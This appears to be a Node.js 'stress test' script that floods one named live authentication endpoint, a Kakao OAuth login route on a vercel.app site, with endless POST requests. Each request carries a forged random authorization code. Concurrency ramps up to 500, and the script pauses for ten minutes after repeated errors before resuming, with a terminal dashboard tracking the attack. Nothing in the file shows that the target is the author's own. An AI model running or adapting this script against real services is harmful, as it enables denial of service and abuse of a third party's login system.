const baseUrl = 'https://wee-sh.vercel.app/api/auth/kakao';

function randomCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
  const part1 = Array(60).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
  const part2 = Array(20).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
  return `${part1}AAABmx${part2}`;
}

const c = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m',
  blue: '\x1b[34m',
  white: '\x1b[37m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
  bgRed: '\x1b[41m',
  bgGreen: '\x1b[42m',
  bgYellow: '\x1b[43m',
  bgBlue: '\x1b[44m'
};

const stats = {
  total: 0,
  success: 0,
  failed: 0,
  status: {},
  times: [],
  startTime: Date.now(),
  lastSecond: Date.now(),
  rpsHistory: [],
  latencyHistory: [],
  lastCode: '',
  errors: 0,
  paused: false,
  pauseUntil: 0,
  pauseCount: 0,
  currentRps: 0
};

const config = {
  initialConcurrent: 50,
  maxConcurrent: 500,
  rampUpInterval: 60 * 1000,
  rampUpStep: 50,
  pauseDuration: 10 * 60 * 1000,
  graphWidth: 60,
  graphHeight: 8
};

let currentConcurrent = config.initialConcurrent;
let running = true;

async function fire() {
  if (stats.paused) return;

  const code = randomCode();
  stats.lastCode = code;
  const start = Date.now();
  try {
    const res = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code }),
      cache: 'no-store'
    });
    const time = Date.now() - start;
    stats.total++;
    stats.times.push(time);
    if (stats.times.length > 10000) stats.times.shift();
    stats.status[res.status] = (stats.status[res.status] || 0) + 1;
    stats.errors = 0;
    if (res.status >= 200 && res.status < 300) stats.success++;
    else stats.failed++;
  } catch (e) {
    stats.total++;
    stats.failed++;
    stats.status['ERR'] = (stats.status['ERR'] || 0) + 1;
    stats.errors++;

    if (stats.errors >= 5) {
      stats.paused = true;
      stats.pauseUntil = Date.now() + config.pauseDuration;
      stats.pauseCount++;
      stats.errors = 0;
    }
  }
}

async function wave() {
  while (running) {
    if (stats.paused) {
      if (Date.now() >= stats.pauseUntil) {
        stats.paused = false;
        currentConcurrent = config.initialConcurrent;
      } else {
        await new Promise(r => setTimeout(r, 1000));
        continue;
      }
    }

    const batch = Array(currentConcurrent).fill().map(() => fire());
    await Promise.all(batch);
  }
}

function getP(arr, p) {
  if (!arr.length) return 0;
  const sorted = [...arr].sort((a, b) => a - b);
  return sorted[Math.floor(sorted.length * p)] || 0;
}

function formatTime(ms) {
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  const d = Math.floor(h / 24);
  if (d > 0) return `${d}d ${String(h % 24).padStart(2, '0')}:${String(m % 60).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
  return `${String(h).padStart(2, '0')}:${String(m % 60).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
}

function drawGraph(data, width, height, label, color, unit = '') {
  if (!data.length) {
    console.log(`  ${c.bold}${label}${c.reset}`);
    console.log(`  ${c.dim}Collecting data...${c.reset}\n`);
    return;
  }

  const visibleData = data.slice(-width);
  const max = Math.max(...visibleData, 1);
  const min = Math.min(...visibleData);

  const blocks = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█'];

  console.log(`  ${c.bold}${label}${c.reset} ${c.dim}min: ${min.toFixed(0)}${unit} | max: ${max.toFixed(0)}${unit}${c.reset}`);
  console.log(`  ${c.dim}${'─'.repeat(width + 4)}${c.reset}`);

  for (let row = height - 1; row >= 0; row--) {
    let line = `  ${c.dim}│${c.reset}`;

    for (let i = 0; i < width; i++) {
      const val = visibleData[i] ?? 0;
      const normalizedVal = val / max;
      const rowPosition = row / height;
      const nextRowPosition = (row + 1) / height;

      if (normalizedVal >= nextRowPosition) {
        line += `${color}█${c.reset}`;
      } else if (normalizedVal > rowPosition) {
        const fraction = (normalizedVal - rowPosition) / (1 / height);
        const blockIndex = Math.floor(fraction * blocks.length);
        line += `${color}${blocks[Math.min(blockIndex, blocks.length - 1)]}${c.reset}`;
      } else {
        line += ' ';
      }
    }
    line += `${c.dim}│${c.reset}`;

    if (row === height - 1) line += ` ${max.toFixed(0)}${unit}`;
    if (row === 0) line += ` 0${unit}`;

    console.log(line);
  }

  console.log(`  ${c.dim}${'─'.repeat(width + 4)}${c.reset}`);
  console.log('');
}

function drawStatusBars() {
  console.log(`  ${c.bold}📊 STATUS CODES${c.reset}`);
  console.log(`  ${c.dim}${'─'.repeat(50)}${c.reset}`);

  const sorted = Object.entries(stats.status).sort((a, b) => b[1] - a[1]);
  const width = 35;

  sorted.forEach(([code, count]) => {
    const pct = stats.total ? (count / stats.total) * 100 : 0;
    const barLen = Math.round((pct / 100) * width);
    const color = code === '200' ? c.green : code === '401' ? c.yellow : code === '429' || code === 'ERR' ? c.red : c.blue;

    const bar = `${color}${'█'.repeat(barLen)}${c.reset}${c.dim}${'░'.repeat(width - barLen)}${c.reset}`;
    console.log(`  ${color}${code.padStart(4)}${c.reset} ${bar} ${count.toLocaleString().padStart(8)} (${pct.toFixed(1).padStart(5)}%)`);
  });
  console.log('');
}

function drawLatencyBars() {
  console.log(`  ${c.bold}⏱️  LATENCY${c.reset}`);
  console.log(`  ${c.dim}${'─'.repeat(50)}${c.reset}`);

  const width = 35;
  const metrics = [
    { label: 'MIN', value: Math.min(...stats.times) || 0, color: c.green },
    { label: 'P50', value: getP(stats.times, 0.5), color: c.cyan },
    { label: 'P95', value: getP(stats.times, 0.95), color: c.yellow },
    { label: 'P99', value: getP(stats.times, 0.99), color: c.magenta },
    { label: 'MAX', value: Math.max(...stats.times) || 0, color: c.red }
  ];

  const maxVal = Math.max(...metrics.map(m => m.value), 1);

  metrics.forEach(({ label, value, color }) => {
    const barLen = Math.round((value / maxVal) * width);
    const bar = `${color}${'█'.repeat(barLen)}${c.reset}${c.dim}${'░'.repeat(width - barLen)}${c.reset}`;
    console.log(`  ${label.padStart(4)} ${bar} ${value.toString().padStart(6)}ms`);
  });
  console.log('');
}

function display() {
  const elapsed = Date.now() - stats.startTime;
  const rps = elapsed > 0 ? stats.total / (elapsed / 1000) : 0;

  const now = Date.now();
  if (now - stats.lastSecond >= 1000) {
    const prevTotal = stats.rpsHistory.length > 0 ? stats.rpsHistory[stats.rpsHistory.length - 1].total : 0;
    const instantRps = stats.total - prevTotal;
    stats.rpsHistory.push({ rps: instantRps > 0 ? instantRps : 0, total: stats.total });
    stats.latencyHistory.push(getP(stats.times, 0.5));
    if (stats.rpsHistory.length > 120) stats.rpsHistory.shift();
    if (stats.latencyHistory.length > 120) stats.latencyHistory.shift();
    stats.lastSecond = now;
    stats.currentRps = instantRps;
  }

  console.clear();

  console.log(`${c.bold}${c.cyan}`);
  console.log(`  ███████╗████████╗██████╗ ███████╗███████╗███████╗  ████████╗███████╗███████╗████████╗`);
  console.log(`  ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝  ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝`);
  console.log(`  ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗     ██║   █████╗  ███████╗   ██║   `);
  console.log(`  ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║     ██║   ██╔══╝  ╚════██║   ██║   `);
  console.log(`  ███████║   ██║   ██║  ██║███████╗███████║███████║     ██║   ███████╗███████║   ██║   `);
  console.log(`  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝     ╚═╝   ╚══════╝╚══════╝   ╚═╝   ${c.reset}`);
  console.log(`  ${c.dim}∞ INFINITE MODE${c.reset}\n`);

  const status = stats.paused
    ? `${c.bgRed}${c.white} PAUSED ${c.reset} ${c.red}Resume in ${formatTime(stats.pauseUntil - Date.now())}${c.reset}`
    : `${c.bgGreen}${c.white} ACTIVE ${c.reset}`;

  console.log(`  ${c.bold}TARGET${c.reset}   ${baseUrl}`);
  console.log(`  ${c.bold}UPTIME${c.reset}   ${formatTime(elapsed)}    ${status}`);
  console.log(`  ${c.dim}${'─'.repeat(70)}${c.reset}\n`);

  console.log(`  ${c.green}✓ SUCCESS${c.reset}  ${stats.success.toLocaleString().padStart(12)}    ${c.yellow}⚡ RPS${c.reset}      ${stats.currentRps.toFixed(0).padStart(8)} req/s`);
  console.log(`  ${c.red}✗ FAILED${c.reset}   ${stats.failed.toLocaleString().padStart(12)}    ${c.cyan}AVG RPS${c.reset}   ${rps.toFixed(1).padStart(8)} req/s`);
  console.log(`  ${c.bold}Σ TOTAL${c.reset}    ${stats.total.toLocaleString().padStart(12)}    ${c.magenta}CONC${c.reset}      ${currentConcurrent.toString().padStart(8)}`);
  console.log(`  ${c.dim}⏸ PAUSES${c.reset}   ${stats.pauseCount.toString().padStart(12)}    ${c.dim}ERRORS${c.reset}    ${stats.errors.toString().padStart(8)}/5`);
  console.log('');

  const rpsData = stats.rpsHistory.map(h => h.rps);
  drawGraph(rpsData, config.graphWidth, config.graphHeight, '📈 RPS', c.green, '');
  drawGraph(stats.latencyHistory, config.graphWidth, 6, '⏱️  P50 LATENCY', c.cyan, 'ms');

  drawStatusBars();
  drawLatencyBars();

  console.log(`  ${c.dim}🎲 ${stats.lastCode.slice(0, 50)}...${c.reset}`);
  console.log(`  ${c.dim}Ctrl+C to stop${c.reset}`);
}

function rampUp() {
  setInterval(() => {
    if (!stats.paused && currentConcurrent < config.maxConcurrent) {
      currentConcurrent += config.rampUpStep;
      currentConcurrent = Math.min(currentConcurrent, config.maxConcurrent);
    }
  }, config.rampUpInterval);
}

async function main() {
  console.log(`${c.bold}${c.cyan}STRESS TEST${c.reset}`);
  console.log(`${c.dim}────────────────────────${c.reset}`);
  console.log(`${c.yellow}Target:${c.reset} ${baseUrl}`);
  console.log(`${c.yellow}Mode:${c.reset} Infinite`);
  console.log(`${c.yellow}Pause:${c.reset} 10min on 5 errors`);
  console.log(`${c.dim}────────────────────────${c.reset}`);
  console.log(`${c.green}Starting in 3s...${c.reset}`);
  await new Promise(r => setTimeout(r, 3000));

  rampUp();
  wave();
  setInterval(display, 500);
}

process.on('SIGINT', () => {
  running = false;
  console.clear();
  console.log(`\n${c.cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`);
  console.log(`${c.bold}  FINAL REPORT${c.reset}`);
  console.log(`${c.cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}\n`);
  console.log(`  Total:    ${stats.total.toLocaleString()}`);
  console.log(`  ${c.green}Success:${c.reset}  ${stats.success.toLocaleString()}`);
  console.log(`  ${c.red}Failed:${c.reset}   ${stats.failed.toLocaleString()}`);
  console.log(`  Avg RPS:  ${(stats.total / ((Date.now() - stats.startTime) / 1000)).toFixed(1)}`);
  console.log(`  Pauses:   ${stats.pauseCount}`);
  console.log(`  Uptime:   ${formatTime(Date.now() - stats.startTime)}`);
  console.log(`\n${c.cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}\n`);
  process.exit(0);
});

main();